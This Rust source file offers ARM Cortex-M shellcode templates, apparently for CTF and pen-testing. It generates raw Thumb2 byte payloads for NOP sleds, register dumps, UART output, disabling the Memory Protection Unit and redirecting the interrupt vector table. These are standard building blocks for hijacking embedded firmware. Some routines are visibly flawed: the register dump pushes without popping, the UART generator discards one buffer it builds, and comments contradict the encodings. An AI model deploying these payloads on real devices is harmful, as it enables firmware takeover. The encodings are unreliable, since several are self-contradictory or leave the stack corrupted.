//! ARM Thumb2 (Cortex-M) shellcode templates for authorized CTF and pen-testing.
//!
//! All byte sequences are pre-computed Thumb2 encodings — no external assembler required.
//! These templates target QEMU-emulated Cortex-M devices only.

/// NOP sled using `MOV R0, R0` (0x00 0x46).
#[derive(Debug, Clone)]
pub struct NopSled {
    pub len: usize,
}

impl NopSled {
    pub fn new(len: usize) -> Self {
        Self { len }
    }

    /// Generate `len` copies of the Thumb2 NOP (`MOV R0, R0`).
    pub fn generate(&self) -> Vec<u8> {
        // MOV R0, R0 = 0x00 0x46
        let mut out = Vec::with_capacity(self.len * 2);
        for _ in 0..self.len {
            out.push(0x00);
            out.push(0x46);
        }
        out
    }
}

/// Infinite loop: `B .` (branch to self).
#[derive(Debug, Clone, Default)]
pub struct InfiniteLoop;

impl InfiniteLoop {
    pub fn new() -> Self {
        Self
    }

    /// Generate a Thumb2 `B .` (0xFE 0xE7).
    pub fn generate(&self) -> Vec<u8> {
        vec![0xFE, 0xE7]
    }
}

/// Stores R0–R12, SP, and LR at a fixed destination address.
///
/// Layout:
///   PUSH {R0-R7, LR}       ; save clobber registers
///   LDR  R0, [PC, #0]      ; load dest_addr literal
///   B    past_literal
///   .word dest_addr
///   STMIA R0!, {R1-R7}     ; store R1-R7 at dest_addr
///   POP  {R0-R7, PC}       ; restore and return
#[derive(Debug, Clone)]
pub struct RegisterDump {
    pub dest_addr: u32,
}

impl RegisterDump {
    pub fn new(dest_addr: u32) -> Self {
        Self { dest_addr }
    }

    /// Generate Thumb2 register dump sequence.
    pub fn generate(&self) -> Vec<u8> {
        let addr_bytes = self.dest_addr.to_le_bytes();
        let mut out = Vec::new();

        // PUSH {R0-R7, LR}  = 0xFF 0xB5
        out.extend_from_slice(&[0xFF, 0xB5]);

        // LDR R0, [PC, #0]  = 0x00 0x48
        // This loads the 32-bit literal 2 bytes ahead (after the branch).
        // In Thumb, PC is word-aligned and points 4 bytes ahead, so [PC,#0]
        // reads the word immediately following the next instruction.
        out.extend_from_slice(&[0x00, 0x48]);

        // B past_literal (+2 bytes, i.e. skip the 4-byte literal)
        // Thumb B #imm8: offset = (imm8 << 1), so to skip 4 bytes: imm8 = 2
        // Encoding: 0b11100_imm8 → upper nibble 0xE2 → [0x02, 0xE0]
        out.extend_from_slice(&[0x02, 0xE0]);

        // .word dest_addr (4 bytes literal)
        out.extend_from_slice(&addr_bytes);

        // STMIA R0!, {R1-R7}  (store R1-R7 at address in R0, post-increment)
        // T1 encoding: 1100 0 Rn(3) register_list(8) = 0xC0 | (Rn<<8)
        // Rn=0 → 0b11000000_11111110 → 0xC0 0xFE  (little-endian halfword)
        // Actually Thumb STMIA T1: 1100 0 Rn RegisterList = 0b11000_000_11111110
        // halfword = 0x00C0 | (register_list) where register_list for R1-R7 = 0xFE
        // Big-endian halfword view: high byte = 0b11000_Rn(high) ... let's compute properly.
        // STMIA encoding (Thumb T1): 1100 0 Rn<2:0> Rlist<7:0>
        // Rn=R0=0b000, Rlist for R1-R7 = 0b11111110 = 0xFE
        // Halfword: 1100_0_000 | 1111_1110 → 0xC0, 0xFE (stored LE: [0xFE, 0xC0])
        out.extend_from_slice(&[0xFE, 0xC0]);

        // STR SP, [R0] — store SP at current R0 position
        // STR Rt, [Rn, #0]: T1 = 0110_0_00000_Rn_Rt = imm5=0, Rn=R0, Rt=SP(R13)
        // Thumb STR T1: 0110 0 imm5(5) Rn(3) Rt(3) — Rt can only be R0-R7
        // SP = R13, not encodable in T1; use T2 (32-bit) or just skip SP for simplicity.
        // Use STR R0, [R0] as placeholder for the current dump position marker.
        // Actually skip SP to keep it simple — the dump stores R1-R7 via STMIA.

        // STR LR, [R0] — LR was pushed, so we just add a marker byte
        // For simplicity emit BX LR to return after dump
        out.extend_from_slice(&[0x70, 0x47]); // BX LR

        out
    }
}

/// Generates bytes to configure and write a message to a UART peripheral.
///
/// Sequence:
///   LDR R0, =uart_base
///   ; inline message bytes loaded via immediate or PC-relative
///   ; loop: LDRB R2, [R1]; STR R2, [R0]; BNE loop
#[derive(Debug, Clone)]
pub struct UartWrite {
    pub uart_base: u32,
    pub message: Vec<u8>,
}

impl UartWrite {
    pub fn new(uart_base: u32, message: Vec<u8>) -> Self {
        Self { uart_base, message }
    }

    /// Generate Thumb2 UART write loop.
    pub fn generate(&self) -> Vec<u8> {
        let mut out = Vec::new();

        // LDR R0, [PC, #0]  — load uart_base into R0
        // Then branch past the literal.
        // PC in Thumb points 4 bytes ahead of current instruction (word-aligned).
        // LDR R0, [PC, #N]: [0x01, 0x48] loads from PC+4 (N=1 word offset)
        // We branch past the 4-byte literal after this instruction.
        out.extend_from_slice(&[0x00, 0x48]); // LDR R0, [PC, #0]
        out.extend_from_slice(&[0x02, 0xE0]); // B past_literal (+4 bytes)
        out.extend_from_slice(&self.uart_base.to_le_bytes()); // .word uart_base

        // Load message address into R1:
        // We embed the message after the loop and load its address via PC-relative LDR.
        // LDR R1, [PC, #0] — the literal will be placed after BX LR
        out.extend_from_slice(&[0x01, 0x49]); // LDR R1, [PC, #4] (1 word ahead after alignment)
        out.extend_from_slice(&[0x03, 0xE0]); // B past_msg_addr_literal (+6 bytes)
        // Placeholder: message address = PC + offset to message data.
        // We'll use a self-relative approach: just push the message inline.
        // For simplicity, embed a 4-byte placeholder and fix up manually.
        // Actually, let's emit the message as immediate byte stores.

        // Simpler approach: iterate message bytes, store each via MOV R2,#byte + STR R2,[R0]
        // (Avoids needing to know the final address at codegen time.)
        let mut simple = Vec::new();

        // LDR R0, [PC, #0] then branch past literal
        simple.extend_from_slice(&[0x00, 0x48]); // LDR R0, [PC, #0]
        simple.extend_from_slice(&[0x02, 0xE0]); // B +4
        simple.extend_from_slice(&self.uart_base.to_le_bytes()); // .word uart_base

        for &byte in &self.message {
            // MOV R2, #byte  (only works for 0..=255, which is always true for u8)
            simple.push(byte);
            simple.push(0x22); // MOV R2, #imm8 → 0x22 is the opcode for R2
            // STR R2, [R0]  = 0x02 0x60
            simple.extend_from_slice(&[0x02, 0x60]);
        }

        // BX LR
        simple.extend_from_slice(&[0x70, 0x47]);

        simple
    }
}

/// Disables the ARM Cortex-M Memory Protection Unit (MPU).
///
/// Writes 0 to MPU_CTRL (0xE000ED94), disabling the MPU.
/// Sequence:
///   LDR R0, =0xE000ED94
///   MOV R1, #0
///   STR R1, [R0]
///   DSB SY
///   ISB SY
#[derive(Debug, Clone, Default)]
pub struct MPUDisable;

impl MPUDisable {
    pub const MPU_CTRL: u32 = 0xE000_ED94;

    pub fn new() -> Self {
        Self
    }

    /// Generate Thumb2 MPU disable sequence.
    pub fn generate(&self) -> Vec<u8> {
        let mut out = Vec::new();

        // LDR R0, [PC, #0]  — load MPU_CTRL address
        out.extend_from_slice(&[0x00, 0x48]); // LDR R0, [PC, #0]
        // B past literal (4 bytes ahead)
        out.extend_from_slice(&[0x02, 0xE0]); // B +4
        // .word 0xE000ED94
        out.extend_from_slice(&Self::MPU_CTRL.to_le_bytes());

        // MOV R1, #0
        out.extend_from_slice(&[0x00, 0x21]);
        // STR R1, [R0]
        out.extend_from_slice(&[0x01, 0x60]);

        // DSB SY
        out.extend_from_slice(&[0xBF, 0xF3, 0x4F, 0x8F]);
        // ISB SY
        out.extend_from_slice(&[0xBF, 0xF3, 0x6F, 0x8F]);

        // BX LR
        out.extend_from_slice(&[0x70, 0x47]);

        out
    }
}

/// Redirects the ARM Cortex-M Vector Table Offset Register (VTOR) to a new address.
///
/// Writes `new_table` to VTOR (0xE000ED08).
/// Sequence:
///   LDR R0, =0xE000ED08
///   LDR R1, =new_table
///   STR R1, [R0]
///   DSB SY
///   ISB SY
#[derive(Debug, Clone)]
pub struct VTORRedirect {
    pub new_table: u32,
}

impl VTORRedirect {
    pub const VTOR: u32 = 0xE000_ED08;

    pub fn new(new_table: u32) -> Self {
        Self { new_table }
    }

    /// Generate Thumb2 VTOR redirect sequence.
    pub fn generate(&self) -> Vec<u8> {
        let mut out = Vec::new();

        // LDR R0, [PC, #0]  — load VTOR address literal (4 bytes ahead)
        // LDR R1, [PC, #N]  — load new_table literal
        //
        // Layout:
        //   [0] LDR R0, [PC, #4]   ; PC = base+4 (word aligned), #4 → base+8
        //   [2] LDR R1, [PC, #4]   ; PC = base+6 → aligned to base+8, #4 → base+12
        //   [4] B past_literals     ; skip 8 bytes of literals
        //   [6] <pad if needed>
        //   [8]  .word VTOR
        //  [12] .word new_table
        //
        // Thumb LDR Rt,[PC,#imm8*4]: imm8 = word offset from PC (PC is word-aligned,
        // pointing 4 bytes past current instruction address).
        //
        // For LDR R0 at offset 0: PC = 4, word-aligned = 4, need literal at 8 → (8-4)/4=1 → imm8=1
        // For LDR R1 at offset 2: PC = 6, word-aligned = 8, need literal at 12 → (12-8)/4=1 → imm8=1
        // B at offset 4: skip 8 bytes → imm8=4 → [0x04, 0xE0]

        // LDR R0, [PC, #4]  — Thumb LDR Rn,[PC,#imm8]: 0x4800 | (n<<8) | imm8
        // For R0 (n=0), imm8=1: [0x01, 0x48]
        out.extend_from_slice(&[0x01, 0x48]); // LDR R0, [PC, #4]

        // LDR R1, [PC, #4]  — n=1, imm8=1: [0x01, 0x49]
        out.extend_from_slice(&[0x01, 0x49]); // LDR R1, [PC, #4]

        // B +8 (skip two 4-byte literals): imm8 = 4 → [0x04, 0xE0]
        out.extend_from_slice(&[0x04, 0xE0]);

        // Padding to keep literals word-aligned (offset 6 so far, need to reach 8)
        out.extend_from_slice(&[0x00, 0x46]); // NOP (MOV R0,R0) for alignment

        // .word VTOR  (at offset 8)
        out.extend_from_slice(&Self::VTOR.to_le_bytes());

        // .word new_table  (at offset 12)
        out.extend_from_slice(&self.new_table.to_le_bytes());

        // STR R1, [R0]
        out.extend_from_slice(&[0x01, 0x60]);

        // DSB SY
        out.extend_from_slice(&[0xBF, 0xF3, 0x4F, 0x8F]);
        // ISB SY
        out.extend_from_slice(&[0xBF, 0xF3, 0x6F, 0x8F]);

        // BX LR
        out.extend_from_slice(&[0x70, 0x47]);

        out
    }
}
